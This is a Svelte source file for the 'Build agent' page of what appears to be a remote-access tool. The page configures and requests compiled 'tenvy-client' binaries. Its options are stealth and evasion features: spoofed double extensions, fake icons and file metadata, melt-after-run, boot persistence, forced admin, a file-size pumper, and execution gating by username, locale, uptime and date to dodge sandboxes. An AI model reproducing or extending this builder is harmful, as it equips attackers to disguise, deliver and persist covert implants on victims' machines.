<script lang="ts">
	import { Badge } from '$lib/components/ui/badge/index.js';
	import { Button } from '$lib/components/ui/button/index.js';
	import {
		Card,
		CardContent,
		CardDescription,
		CardHeader,
		CardTitle
	} from '$lib/components/ui/card/index.js';
	import {
		Collapsible,
		CollapsibleContent,
		CollapsibleTrigger
	} from '$lib/components/ui/collapsible/index.js';
	import * as Dialog from '$lib/components/ui/dialog/index.js';
	import { Input } from '$lib/components/ui/input/index.js';
	import { Label } from '$lib/components/ui/label/index.js';
	import { Progress } from '$lib/components/ui/progress/index.js';
	import { Switch } from '$lib/components/ui/switch/index.js';
	import { Textarea } from '$lib/components/ui/textarea/index.js';
	import { Tabs, TabsContent, TabsList, TabsTrigger } from '$lib/components/ui/tabs/index.js';
	import {
		TriangleAlert,
		CircleCheck,
		Info,
		ChevronDown,
		Plus,
		Trash2,
		Wand2
	} from '@lucide/svelte';
	import { onDestroy } from 'svelte';
	import ConnectionTab from './components/ConnectionTab.svelte';
	import PersistenceTab from './components/PersistenceTab.svelte';
	import ExecutionTab from './components/ExecutionTab.svelte';
	import PresentationTab from './components/PresentationTab.svelte';
	import {
		ANTI_TAMPER_BADGES,
		ARCHITECTURE_OPTIONS_BY_OS,
		DEFAULT_FILE_INFORMATION,
		EXTENSION_OPTIONS_BY_OS,
		EXTENSION_SPOOF_PRESETS,
		FILE_PUMPER_UNIT_TO_BYTES,
		FILE_PUMPER_UNITS,
		INPUT_FIELD_CLASSES,
		INSTALLATION_PATH_PRESETS,
		MAX_FILE_PUMPER_BYTES,
		TARGET_OS_OPTIONS,
		type CookieKV,
		type ExtensionSpoofPreset,
		type FilePumperUnit,
		type HeaderKV,
		type TargetArch,
		type TargetOS
	} from './lib/constants.js';
	import {
		addCustomCookie as createCustomCookie,
		addCustomHeader as createCustomHeader,
		generateMutexName as randomMutexSuffix,
		inputValueFromEvent,
		normalizeSpoofExtension,
		parseListInput,
		removeCustomCookie as deleteCustomCookie,
		removeCustomHeader as deleteCustomHeader,
		sanitizeFileInformation as sanitizeFileInformationPayload,
		toIsoDateTime,
		updateCustomCookie as writeCustomCookie,
		updateCustomHeader as writeCustomHeader,
		validateSpoofExtension,
		withPresetSpoofExtension
	} from './lib/utils.js';
	import type { BuildRequest } from '../../../../../shared/types/build';

	type BuildStatus = 'idle' | 'running' | 'success' | 'error';

	type BuildResponse = {
		success: boolean;
		message?: string;
		downloadUrl?: string;
		outputPath?: string;
		log?: string[];
		sharedSecret?: string;
		warnings?: string[];
	};

	let host = $state('localhost');
	let port = $state('2332');
	let outputFilename = $state('tenvy-client');
	let targetOS = $state<TargetOS>('windows');
	let targetArch = $state<TargetArch>('amd64');
	let outputExtension = $state(EXTENSION_OPTIONS_BY_OS.windows[0]);
	let extensionSpoofingEnabled = $state(false);
	let extensionSpoofPreset = $state<ExtensionSpoofPreset>(EXTENSION_SPOOF_PRESETS[0]);
	let extensionSpoofCustom = $state('');
	let extensionSpoofError = $state<string | null>(null);
	let installationPath = $state('');
	let meltAfterRun = $state(false);
	let startupOnBoot = $state(false);
	let developerMode = $state(true);
	let mutexName = $state('');
	let compressBinary = $state(false);
	let forceAdmin = $state(false);
	let fileIconName = $state<string | null>(null);
	let fileIconData = $state<string | null>(null);
	let fileIconError = $state<string | null>(null);
	let generatedSecret = $state<string | null>(null);

	let secretCopyState = $state<'idle' | 'copied' | 'error'>('idle');
	let secretCopyTimeout: ReturnType<typeof setTimeout> | null = null;
	let buildWarnings = $state<string[]>([]);
	let pollIntervalMs = $state('');
	let maxBackoffMs = $state('');
	let shellTimeoutSeconds = $state('');
	let fileInformation = $state({ ...DEFAULT_FILE_INFORMATION });
	let fileInformationOpen = $state(false);
	let watchdogEnabled = $state(false);
	let watchdogIntervalSeconds = $state('60');
	let enableFilePumper = $state(false);
	let filePumperTargetSize = $state('');
	let filePumperUnit = $state<FilePumperUnit>('MB');
	let executionDelaySeconds = $state('');
	let executionAllowedUsernames = $state('');
	let executionAllowedLocales = $state('');
	let executionMinUptimeMinutes = $state('');
	let executionStartDate = $state('');
	let executionEndDate = $state('');
	let executionRequireInternet = $state(true);
	let customHeaders = $state<HeaderKV[]>([{ key: '', value: '' }]);
	let customCookies = $state<CookieKV[]>([{ name: '', value: '' }]);
	let activeTab = $state<'connection' | 'persistence' | 'execution' | 'presentation'>('connection');

	const sanitizedOutputBase = $derived.by(() => {
		const trimmed = outputFilename.trim();
		if (!trimmed) {
			return 'tenvy-client';
		}

		const normalizedExtension = outputExtension.toLowerCase();
		let base = trimmed;
		if (normalizedExtension && trimmed.toLowerCase().endsWith(normalizedExtension)) {
			base = trimmed.slice(0, -normalizedExtension.length);
		}

		const withoutTrailingDot = base.replace(/\.+$/, '');
		const sanitized = withoutTrailingDot.trim();
		return sanitized || 'tenvy-client';
	});

	const activeSpoofExtension = $derived(
		withPresetSpoofExtension(extensionSpoofingEnabled, extensionSpoofCustom, extensionSpoofPreset)
	);

	const effectiveOutputFilename = $derived(
		`${sanitizedOutputBase}${activeSpoofExtension}${outputExtension}`
	);

	const isWindowsTarget = $derived(targetOS === 'windows');

	let buildStatus = $state<BuildStatus>('idle');
	let buildProgress = $state(0);
	let buildError = $state<string | null>(null);
	let downloadUrl = $state<string | null>(null);
	let outputPath = $state<string | null>(null);
	let buildLog = $state<string[]>([]);

	let progressMessages = $state<{ id: number; text: string; tone: 'info' | 'success' | 'error' }[]>(
		[]
	);
	let nextMessageId = $state(0);

	let isBuilding = $derived(buildStatus === 'running');

	$effect(() => {
		const allowedExtensions = EXTENSION_OPTIONS_BY_OS[targetOS] ?? EXTENSION_OPTIONS_BY_OS.windows;
		if (!allowedExtensions.includes(outputExtension)) {
			outputExtension = allowedExtensions[0];
		}
	});

	$effect(() => {
		const archOptions = ARCHITECTURE_OPTIONS_BY_OS[targetOS] ?? ARCHITECTURE_OPTIONS_BY_OS.windows;
		if (!archOptions.some((option) => option.value === targetArch)) {
			targetArch = archOptions[0]?.value ?? 'amd64';
		}
	});

	$effect(() => {
		if (!isWindowsTarget) {
			fileIconName = null;
			fileIconData = null;
			fileIconError = null;
			fileInformation = { ...DEFAULT_FILE_INFORMATION };
		}
	});

	$effect(() => {
		if (!extensionSpoofingEnabled) {
			extensionSpoofError = null;
			return;
		}

		extensionSpoofError = validateSpoofExtension(extensionSpoofCustom) ?? null;
	});

	function resetProgress() {
		buildStatus = 'idle';
		buildProgress = 0;
		buildError = null;
		downloadUrl = null;
		outputPath = null;
		buildLog = [];
		progressMessages = [];
		generatedSecret = null;
		buildWarnings = [];
		fileIconError = null;
		secretCopyState = 'idle';
		if (secretCopyTimeout) {
			clearTimeout(secretCopyTimeout);
			secretCopyTimeout = null;
		}
	}

	function pushProgress(text: string, tone: 'info' | 'success' | 'error' = 'info') {
		progressMessages = [
			...progressMessages,
			{
				id: nextMessageId++,
				text,
				tone
			}
		];
	}

	function applyInstallationPreset(preset: string) {
		installationPath = preset;
	}

	function addCustomHeader() {
		customHeaders = createCustomHeader(customHeaders);
	}

	function updateCustomHeader(index: number, key: keyof HeaderKV, value: string) {
		customHeaders = writeCustomHeader(customHeaders, index, key, value);
	}

	function removeCustomHeader(index: number) {
		const updated = deleteCustomHeader(customHeaders, index);
		customHeaders = updated.length > 0 ? updated : [{ key: '', value: '' }];
	}

	function addCustomCookie() {
		customCookies = createCustomCookie(customCookies);
	}

	function updateCustomCookie(index: number, key: keyof CookieKV, value: string) {
		customCookies = writeCustomCookie(customCookies, index, key, value);
	}

	function removeCustomCookie(index: number) {
		const updated = deleteCustomCookie(customCookies, index);
		customCookies = updated.length > 0 ? updated : [{ name: '', value: '' }];
	}

	function assignMutexName(length = 16) {
		mutexName = `Global\\tenvy-${randomMutexSuffix(length).toUpperCase()}`;
	}

	async function handleIconSelection(event: Event) {
		const input = event.target as HTMLInputElement;
		const file = input.files?.[0] ?? null;
		fileIconError = null;

		if (!file) {
			fileIconName = null;
			fileIconData = null;
			return;
		}

		if (file.size > 512 * 1024) {
			fileIconError = 'Icon file must be 512KB or smaller.';
			fileIconName = null;
			fileIconData = null;
			return;
		}

		try {
			const buffer = await file.arrayBuffer();
			const bytes = new Uint8Array(buffer);
			let binary = '';
			for (const byte of bytes) {
				binary += String.fromCharCode(byte);
			}
			fileIconData = btoa(binary);
			fileIconName = file.name;
		} catch (err) {
			fileIconError = err instanceof Error ? err.message : 'Failed to read icon file.';
			fileIconName = null;
			fileIconData = null;
		}
	}

	function clearIconSelection() {
		fileIconName = null;
		fileIconData = null;
		fileIconError = null;
	}

	async function buildAgent() {
		if (buildStatus === 'running') {
			return;
		}

		resetProgress();

		const trimmedHost = host.trim();
		const trimmedPort = port.trim();
		const trimmedPollInterval = pollIntervalMs.trim();
		const trimmedMaxBackoff = maxBackoffMs.trim();
		const trimmedShellTimeout = shellTimeoutSeconds.trim();

		if (!trimmedHost) {
			buildError = 'Host is required.';
			pushProgress(buildError, 'error');
			buildStatus = 'error';
			buildProgress = 100;
			return;
		}
		if (trimmedPort && !/^\d+$/.test(trimmedPort)) {
			buildError = 'Port must be numeric.';
			pushProgress(buildError, 'error');
			buildStatus = 'error';
			buildProgress = 100;
			return;
		}
		if (trimmedPollInterval) {
			const pollValue = Number(trimmedPollInterval);
			if (!Number.isFinite(pollValue) || pollValue < 1000 || pollValue > 3_600_000) {
				buildError = 'Poll interval must be between 1,000 and 3,600,000 milliseconds.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}
		}
		if (trimmedMaxBackoff) {
			const backoffValue = Number(trimmedMaxBackoff);
			if (!Number.isFinite(backoffValue) || backoffValue < 1000 || backoffValue > 86_400_000) {
				buildError = 'Max backoff must be between 1,000 and 86,400,000 milliseconds.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}
		}
		if (trimmedShellTimeout) {
			const timeoutValue = Number(trimmedShellTimeout);
			if (!Number.isFinite(timeoutValue) || timeoutValue < 5 || timeoutValue > 7_200) {
				buildError = 'Shell timeout must be between 5 and 7,200 seconds.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}
		}

		const sanitizedHeaders = customHeaders
			.map((header) => ({
				key: header.key.trim(),
				value: header.value.trim()
			}))
			.filter((header) => header.key !== '' && header.value !== '');

		const sanitizedCookies = customCookies
			.map((cookie) => ({
				name: cookie.name.trim(),
				value: cookie.value.trim()
			}))
			.filter((cookie) => cookie.name !== '' && cookie.value !== '');

		const trimmedWatchdogInterval = watchdogIntervalSeconds.trim();
		let watchdogIntervalValue: number | null = null;
		if (watchdogEnabled) {
			const interval = trimmedWatchdogInterval ? Number(trimmedWatchdogInterval) : 60;
			if (!Number.isFinite(interval) || interval < 5 || interval > 86_400) {
				buildError = 'Watchdog interval must be between 5 and 86,400 seconds.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}
			watchdogIntervalValue = Math.round(interval);
		}

		const trimmedFilePumperSize = filePumperTargetSize.trim();
		let filePumperTargetBytes: number | null = null;
		if (enableFilePumper) {
			if (!trimmedFilePumperSize) {
				buildError = 'Provide a target size for the file pumper or disable the feature.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}

			const parsedSize = Number.parseFloat(trimmedFilePumperSize);
			if (!Number.isFinite(parsedSize) || parsedSize <= 0) {
				buildError = 'File pumper size must be a positive number.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}

			const multiplier = FILE_PUMPER_UNIT_TO_BYTES[filePumperUnit] ?? FILE_PUMPER_UNIT_TO_BYTES.MB;
			const computedBytes = Math.round(parsedSize * multiplier);
			if (
				!Number.isFinite(computedBytes) ||
				computedBytes <= 0 ||
				computedBytes > MAX_FILE_PUMPER_BYTES
			) {
				buildError = 'File pumper target size is too large. Maximum supported size is 10 GiB.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}

			filePumperTargetBytes = computedBytes;
		}

		const trimmedExecutionDelay = executionDelaySeconds.trim();
		let executionDelayValue: number | null = null;
		if (trimmedExecutionDelay) {
			const parsedDelay = Number.parseInt(trimmedExecutionDelay, 10);
			if (!Number.isFinite(parsedDelay) || parsedDelay < 0 || parsedDelay > 86_400) {
				buildError = 'Delayed start must be between 0 and 86,400 seconds.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}
			executionDelayValue = parsedDelay;
		}

		const trimmedExecutionUptime = executionMinUptimeMinutes.trim();
		let executionUptimeValue: number | null = null;
		if (trimmedExecutionUptime) {
			const parsedUptime = Number.parseInt(trimmedExecutionUptime, 10);
			if (!Number.isFinite(parsedUptime) || parsedUptime < 0 || parsedUptime > 10_080) {
				buildError = 'Minimum uptime must be between 0 and 10,080 minutes (7 days).';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}
			executionUptimeValue = parsedUptime;
		}

		const allowedUsernames = parseListInput(executionAllowedUsernames);
		const allowedLocales = parseListInput(executionAllowedLocales);

		const startIso = toIsoDateTime(executionStartDate);
		if (executionStartDate.trim() && !startIso) {
			buildError = 'Earliest run time must be a valid date/time.';
			pushProgress(buildError, 'error');
			buildStatus = 'error';
			buildProgress = 100;
			return;
		}

		const endIso = toIsoDateTime(executionEndDate);
		if (executionEndDate.trim() && !endIso) {
			buildError = 'Latest run time must be a valid date/time.';
			pushProgress(buildError, 'error');
			buildStatus = 'error';
			buildProgress = 100;
			return;
		}

		if (startIso && endIso) {
			const startTime = new Date(startIso).getTime();
			const endTime = new Date(endIso).getTime();
			if (Number.isFinite(startTime) && Number.isFinite(endTime) && startTime > endTime) {
				buildError = 'Earliest run time must be before the latest run time.';
				pushProgress(buildError, 'error');
				buildStatus = 'error';
				buildProgress = 100;
				return;
			}
		}

		buildStatus = 'running';
		buildProgress = 5;
		pushProgress('Preparing build request...');

		const payload: BuildRequest = {
			host: trimmedHost,
			port: trimmedPort || '2332',
			outputFilename: effectiveOutputFilename,
			outputExtension,
			targetOS,
			targetArch,
			installationPath: installationPath.trim(),
			meltAfterRun,
			startupOnBoot,
			developerMode,
			mutexName: mutexName.trim(),
			compressBinary,
			forceAdmin
		};

		if (watchdogIntervalValue !== null) {
			payload.watchdog = {
				enabled: true,
				intervalSeconds: watchdogIntervalValue
			};
		}
		if (filePumperTargetBytes !== null) {
			payload.filePumper = {
				enabled: true,
				targetBytes: filePumperTargetBytes
			};
		}

		const shouldIncludeExecutionTriggers =
			executionDelayValue !== null ||
			executionUptimeValue !== null ||
			allowedUsernames.length > 0 ||
			allowedLocales.length > 0 ||
			Boolean(startIso) ||
			Boolean(endIso) ||
			!executionRequireInternet;

		if (shouldIncludeExecutionTriggers) {
			const executionPayload: Record<string, unknown> = {
				requireInternet: executionRequireInternet
			};
			if (executionDelayValue !== null) {
				executionPayload.delaySeconds = executionDelayValue;
			}
			if (executionUptimeValue !== null) {
				executionPayload.minUptimeMinutes = executionUptimeValue;
			}
			if (allowedUsernames.length > 0) {
				executionPayload.allowedUsernames = allowedUsernames;
			}
			if (allowedLocales.length > 0) {
				executionPayload.allowedLocales = allowedLocales;
			}
			if (startIso) {
				executionPayload.startTime = startIso;
			}
			if (endIso) {
				executionPayload.endTime = endIso;
			}
			payload.executionTriggers = executionPayload;
		}

		if (sanitizedHeaders.length > 0) {
			payload.customHeaders = sanitizedHeaders;
		}
		if (sanitizedCookies.length > 0) {
			payload.customCookies = sanitizedCookies;
		}
		if (trimmedPollInterval) {
			payload.pollIntervalMs = trimmedPollInterval;
		}
		if (trimmedMaxBackoff) {
			payload.maxBackoffMs = trimmedMaxBackoff;
		}
		if (trimmedShellTimeout) {
			payload.shellTimeoutSeconds = trimmedShellTimeout;
		}
		if (isWindowsTarget && fileIconData) {
			payload.fileIcon = {
				name: fileIconName,
				data: fileIconData
			};
		}

		const info = sanitizeFileInformationPayload(fileInformation);
		if (isWindowsTarget && Object.keys(info).length > 0) {
			payload.fileInformation = info;
		}

		try {
			pushProgress('Dispatching build to compiler environment...');
			buildProgress = 20;
			const response = await fetch('/api/build', {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify(payload)
			});

			const result = (await response.json()) as BuildResponse;
			buildLog = result.log ?? [];
			generatedSecret = result.sharedSecret ?? null;
			buildWarnings = result.warnings ?? [];

			if (!response.ok || !result.success) {
				const message = result.message || 'Failed to build agent.';
				throw new Error(message);
			}

			buildProgress = 65;
			pushProgress('Compilation completed. Finalizing artifacts...');

			downloadUrl = result.downloadUrl ?? null;
			outputPath = result.outputPath ?? null;

			buildProgress = 100;
			buildStatus = 'success';
			pushProgress('Agent binary is ready.', 'success');
		} catch (err) {
			buildProgress = 100;
			buildStatus = 'error';
			buildError = err instanceof Error ? err.message : 'Unknown build error.';
			pushProgress(buildError, 'error');
		}
	}

	function messageToneClasses(tone: 'info' | 'success' | 'error') {
		if (tone === 'success') return 'text-emerald-500';
		if (tone === 'error') return 'text-red-500';
		return 'text-muted-foreground';
	}

	function toneIcon(tone: 'info' | 'success' | 'error') {
		if (tone === 'success') return CircleCheck;
		if (tone === 'error') return TriangleAlert;
		return Info;
	}

	function buildStatusBadgeClasses(status: BuildStatus) {
		if (status === 'success') return 'border-emerald-500/50 bg-emerald-500/10 text-emerald-600';
		if (status === 'error') return 'border-red-500/60 bg-red-500/10 text-red-600';
		if (status === 'running') return 'border-sky-500/60 bg-sky-500/10 text-sky-600';
		return 'text-muted-foreground';
	}

	function buildStatusLabel(status: BuildStatus) {
		if (status === 'success') return 'Complete';
		if (status === 'error') return 'Error';
		if (status === 'running') return 'Building';
		return 'Idle';
	}

	function scheduleSecretCopyReset() {
		if (secretCopyTimeout) {
			clearTimeout(secretCopyTimeout);
		}
		secretCopyTimeout = setTimeout(() => {
			secretCopyState = 'idle';
			secretCopyTimeout = null;
		}, 2000);
	}

	async function copySharedSecret() {
		if (!generatedSecret) {
			return;
		}

		if (typeof navigator === 'undefined' || !navigator.clipboard) {
			secretCopyState = 'error';
			scheduleSecretCopyReset();
			return;
		}

		try {
			await navigator.clipboard.writeText(generatedSecret);
			secretCopyState = 'copied';
		} catch {
			secretCopyState = 'error';
		}

		scheduleSecretCopyReset();
	}

	onDestroy(() => {
		if (secretCopyTimeout) {
			clearTimeout(secretCopyTimeout);
			secretCopyTimeout = null;
		}
	});
</script>

<div class="mx-auto w-full space-y-6 px-4 pb-10">
	<Card>
		<CardHeader class="space-y-4">
			<div class="flex flex-wrap items-center justify-between gap-3">
				<div class="space-y-1">
					<CardTitle>Build agent</CardTitle>
					<CardDescription>
						Configure connection and persistence options, then generate a customized client binary.
					</CardDescription>
				</div>
				<div class="flex flex-wrap gap-2">
					{#each ANTI_TAMPER_BADGES as badge (badge)}
						<Badge
							variant="outline"
							class="border-emerald-500/40 bg-emerald-500/10 text-[0.65rem] font-medium tracking-wide text-emerald-600 uppercase"
						>
							{badge}
						</Badge>
					{/each}
				</div>
			</div>
			<p class="text-xs text-muted-foreground">
				These safeguards are always embedded into generated builds. Customize the remaining options
				to match your delivery strategy.
			</p>
		</CardHeader>
		<CardContent class="space-y-8">
			<div class="grid gap-8 xl:grid-cols-[minmax(0,2.35fr)_minmax(0,1fr)]">
				<div class="space-y-8">
					<Tabs bind:value={activeTab} class="space-y-6">
						<TabsList
							class="flex w-full flex-wrap gap-2 rounded-lg border border-border/70 bg-muted/40 p-1"
						>
							<TabsTrigger value="connection" class="flex-1 sm:flex-none">Connection</TabsTrigger>
							<TabsTrigger value="persistence" class="flex-1 sm:flex-none">Persistence</TabsTrigger>
							<TabsTrigger value="execution" class="flex-1 sm:flex-none">Execution</TabsTrigger>
							<TabsTrigger value="presentation" class="flex-1 sm:flex-none"
								>Presentation</TabsTrigger
							>
						</TabsList>

						<TabsContent value="connection" class="space-y-6">
							<ConnectionTab
								bind:host
								bind:port
								bind:outputFilename
								{effectiveOutputFilename}
								bind:targetOS
								bind:targetArch
								bind:outputExtension
								bind:extensionSpoofingEnabled
								bind:extensionSpoofPreset
								bind:extensionSpoofCustom
								{extensionSpoofError}
								bind:pollIntervalMs
								bind:maxBackoffMs
								bind:shellTimeoutSeconds
								{customHeaders}
								{customCookies}
								{addCustomHeader}
								{updateCustomHeader}
								{removeCustomHeader}
								{addCustomCookie}
								{updateCustomCookie}
								{removeCustomCookie}
							/>
						</TabsContent>
						<TabsContent value="persistence" class="space-y-6">
							<PersistenceTab
								bind:installationPath
								bind:mutexName
								bind:meltAfterRun
								bind:startupOnBoot
								bind:developerMode
								bind:compressBinary
								bind:forceAdmin
								bind:watchdogEnabled
								bind:watchdogIntervalSeconds
								bind:enableFilePumper
								bind:filePumperTargetSize
								bind:filePumperUnit
								{applyInstallationPreset}
								{assignMutexName}
							/>
						</TabsContent>
						<TabsContent value="execution" class="space-y-6">
							<ExecutionTab
								bind:executionDelaySeconds
								bind:executionMinUptimeMinutes
								bind:executionAllowedUsernames
								bind:executionAllowedLocales
								bind:executionStartDate
								bind:executionEndDate
								bind:executionRequireInternet
							/>
						</TabsContent>
						<TabsContent value="presentation" class="space-y-6">
							<PresentationTab
								{fileIconName}
								{fileIconError}
								{handleIconSelection}
								{clearIconSelection}
								{isWindowsTarget}
								bind:fileInformationOpen
								{fileInformation}
							/>
						</TabsContent>
					</Tabs>
				</div>
				<aside class="space-y-4 xl:sticky xl:top-24">
					<div class="space-y-4 rounded-lg border border-border/70 bg-background/60 p-6">
						<div class="flex items-start justify-between gap-3">
							<div class="space-y-1">
								<h3 class="text-sm font-semibold">Build status</h3>
								<p class="text-xs text-muted-foreground">
									Monitor compilation progress and download artifacts.
								</p>
							</div>
							<Badge variant="outline" class={buildStatusBadgeClasses(buildStatus)}
								>{buildStatusLabel(buildStatus)}</Badge
							>
						</div>

						{#if buildStatus === 'idle'}
							<p class="text-xs text-muted-foreground">
								Start a build to view progress updates, download links, and generated secrets.
							</p>
						{:else}
							<div class="space-y-4">
								<div class="space-y-2">
									<div class="flex items-center justify-between text-sm">
										<span class="font-medium">Progress</span>
										<span>{buildProgress}%</span>
									</div>
									<Progress value={buildProgress} max={100} class="h-2" />
								</div>
								<ul class="space-y-2 text-sm">
									{#each progressMessages as message (message.id)}
										{#if message}
											{@const Icon = toneIcon(message.tone)}
											<li class={`flex items-start gap-2 ${messageToneClasses(message.tone)}`}>
												<Icon class="mt-0.5 h-4 w-4" />
												<span class="text-left">{message.text}</span>
											</li>
										{/if}
									{/each}
								</ul>
								{#if downloadUrl || outputPath}
									<div class="rounded-md bg-muted/50 p-3 text-xs">
										{#if downloadUrl}
											<p class="flex flex-wrap items-center gap-1">
												<span>Download:</span>
												<a
													class="font-medium text-primary underline"
													href={downloadUrl}
													rel="external"
													target="_blank"
													download>agent binary</a
												>
											</p>
										{/if}
										{#if outputPath}
											<p class="mt-1 break-words text-muted-foreground">Saved to {outputPath}</p>
										{/if}
									</div>
								{/if}
								{#if buildLog.length}
									<div>
										<p class="text-xs font-semibold tracking-wide text-muted-foreground uppercase">
											Build log
										</p>
										<pre
											class="mt-2 max-h-48 overflow-auto rounded-md bg-muted/40 p-3 font-mono text-xs">
                                                {buildLog.join('\n')}
										</pre>
									</div>
								{/if}
								{#if generatedSecret}
									<div class="rounded-md border border-border/70 bg-muted/30 p-3 text-xs">
										<p class="font-semibold text-muted-foreground">Generated shared secret</p>
										<p class="mt-1 font-mono text-sm">{generatedSecret}</p>
										<p class="mt-1 text-xs text-muted-foreground">
											Store this value securely. It is embedded in the binary and required for agent
											authentication.
										</p>
										<div class="mt-2 flex flex-wrap items-center gap-2 text-xs">
											<Button type="button" variant="outline" size="sm" onclick={copySharedSecret}>
												{secretCopyState === 'copied' ? 'Copied' : 'Copy secret'}
											</Button>
											{#if secretCopyState === 'error'}
												<span class="text-red-500">Copy failed</span>
											{/if}
											{#if secretCopyState === 'copied'}
												<span class="text-emerald-600">Secret copied to clipboard</span>
											{/if}
										</div>
									</div>
								{/if}
								{#if buildWarnings.length}
									<div class="rounded-md border border-amber-500/60 bg-amber-500/10 p-3 text-xs">
										<p class="font-semibold text-amber-600">Warnings</p>
										<ul class="mt-1 space-y-1">
											{#each buildWarnings as warning, index (index)}
												<li>{warning}</li>
											{/each}
										</ul>
									</div>
								{/if}
							</div>
						{/if}
					</div>

					<div class="space-y-4 rounded-lg border border-border/70 bg-background/60 p-6">
						<div class="space-y-2">
							<h3 class="text-sm font-semibold">Ready to build?</h3>
							<p class="text-xs text-muted-foreground">
								Provide a host and port to embed defaults inside the generated binary. Additional
								preferences are stored for the agent to consume on first launch.
							</p>
						</div>
						<Button type="button" class="w-full" disabled={isBuilding} onclick={buildAgent}>
							{isBuilding ? 'Building…' : 'Build Agent'}
						</Button>
					</div>
				</aside>
			</div>
		</CardContent>
	</Card>
</div>
